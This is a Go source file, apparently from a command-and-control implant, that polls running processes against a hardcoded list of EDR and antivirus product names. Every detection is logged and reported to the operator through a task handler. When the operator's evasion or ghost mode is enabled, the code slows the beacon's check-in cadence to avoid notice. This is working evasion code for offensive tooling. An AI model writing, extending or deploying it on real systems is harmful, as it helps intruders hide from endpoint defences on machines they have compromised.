//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"fmt"
	"strings"
	"sync"
	"time"
)

type EdrAlert struct {
	Severity   int     `json:"severity"`
	Detector   string  `json:"detector"`
	Confidence float64 `json:"confidence"`
	Detail     string  `json:"detail"`
	Timestamp  int64   `json:"timestamp"`
}

var (
	edrAlerts      []EdrAlert
	edrMu          sync.Mutex
	edrMonitorOnce sync.Once
	edrProcessList = []string{
		"crowdstrike", "csfalcon", "sentinelone", "sentinelagent",
		"cylance", "carbonblack", "cb.exe", "windefend", "msmpeng",
		"symantec", "sep", "trendmicro", "tmcc", "mcafee", "mfe",
		"paloaltonetworks", "traps", "sophos", "sav", "kaspersky",
		"avp", "bitdefender", "vsserv", "f-secure", "fsav",
		"eset", "ekrn", "fortinet", "fmon", "webroot", "wrsa",
		"tanium", "taniumclient", "tpython",
		"fireeye", "elastic-agent",
		"trelix", "sense", "mssense",
	}
	edrLastScan time.Time
)

func startEdrMonitor() {
	edrMonitorOnce.Do(func() {
		go edrMonitorLoop()
	})
}

func edrMonitorLoop() {
	for {
		scanForEDR()
		time.Sleep(30 * time.Second)
	}
}

func scanForEDR() {
	procStr, err := getProcessList()
	if err != nil {
		return
	}
	edrMu.Lock()
	defer edrMu.Unlock()
	edrLastScan = time.Now()
	now := time.Now().Unix()

	lower := strings.ToLower(procStr)
	for _, edr := range edrProcessList {
		if strings.Contains(lower, edr) {
			dup := false
			for _, a := range edrAlerts {
				if a.Detector == edr && a.Timestamp > now-300 {
					dup = true
					break
				}
			}
			if !dup {
				edrAlerts = append(edrAlerts, EdrAlert{
					Severity:   4,
					Detector:   edr,
					Confidence: 0.85,
					Detail:     "EDR process detected",
					Timestamp:  now,
				})
				// Sleeping slower under EDR is an evasion behavior: on a stock
				// Windows box "defender detection" fires immediately (msmpeng),
				// so only degrade the beacon cadence when the operator opted in
				// to evasion/ghost features. Default builds keep their normal
				// cadence and stay visible in beacon management.
				if (evasionEnabled || ghostModeEnabled) &&
					(getSleepMode() == SleepModeDefault || getSleepMode() == SleepModeInteractive) {
					setSleepMode(SleepModeIdle)
				}
			}
		}
	}
}

func getEdrAlerts() []EdrAlert {
	edrMu.Lock()
	defer edrMu.Unlock()
	out := make([]EdrAlert, len(edrAlerts))
	copy(out, edrAlerts)
	return out
}

func clearEdrAlerts() {
	edrMu.Lock()
	defer edrMu.Unlock()
	edrAlerts = nil
}

func handleEdrStatus(task Task, res *TaskResult) {
	alerts := getEdrAlerts()
	if len(alerts) == 0 {
		res.Output = "no EDR indicators detected"
		return
	}
	var b strings.Builder
	for _, a := range alerts {
		b.WriteString(a.Detector)
		b.WriteString(" (confidence: ")
		b.WriteString(floatToStr(a.Confidence, 2))
		b.WriteString(")\n")
	}
	res.Output = b.String()
}

func floatToStr(f float64, precision int) string {
	s := strings.TrimRight(strings.TrimRight(
		formatFloat(f, precision), "0"), ".")
	if s == "" || s == "." {
		return "0"
	}
	return s
}

func formatFloat(f float64, precision int) string {
	if precision == 0 {
		if f >= 1 {
			return "1"
		}
		return "0"
	}
	mul := 1
	for i := 0; i < precision; i++ {
		mul *= 10
	}
	val := int(f * float64(mul))
	integral := val / mul
	fraction := val % mul
	result := strings.TrimRight(strings.TrimRight(
		fmt.Sprintf("%d.%0*d", integral, precision, fraction), "0"), ".")
	if result == "" {
		return "0"
	}
	return result
}
